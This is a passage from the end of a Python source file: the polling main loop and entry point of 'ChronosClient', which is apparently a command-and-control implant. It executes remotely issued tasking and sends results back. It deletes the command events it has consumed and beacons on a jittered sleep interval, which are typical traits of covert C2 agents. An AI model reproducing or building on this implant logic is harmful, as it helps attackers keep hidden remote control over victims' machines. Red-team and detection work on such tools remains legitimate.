                    response = self.execute_tasks(parsed)

                    if response:
                        self._log(f"Got response to send ({len(response)} bytes)")
                        self.send_response(response)
                    else:
                        self._log("No response to send (empty tasking)")

                    # Mark this message as processed (prevents re-execution
                    # if the event isn't deleted before the next poll)
                    if msg_id:
                        self._mark_processed(msg_id)

                    # Delete all cmd event(s) we consumed (may be chunked)
                    for eid in task_event.get('event_ids', []):
                        self._delete_event(eid)

                # Sleep with jitter, in 1-second increments so exit is responsive
                jitter_pct = self.jitter / 100.0
                jitter_factor = 1.0 + random.uniform(-jitter_pct, jitter_pct)
                sleep_time = max(5, int(self.poll_interval * jitter_factor))
                self._log(f"Sleeping {sleep_time}s...")
                for _ in range(sleep_time):
                    if not self.running:
                        break
                    time.sleep(1)

            except KeyboardInterrupt:
                self.running = False
            except Exception as e:
                self._log(f"Error in main loop: {e}")
                time.sleep(30)


if __name__ == "__main__":
    agent = ChronosClient()
    agent.run()
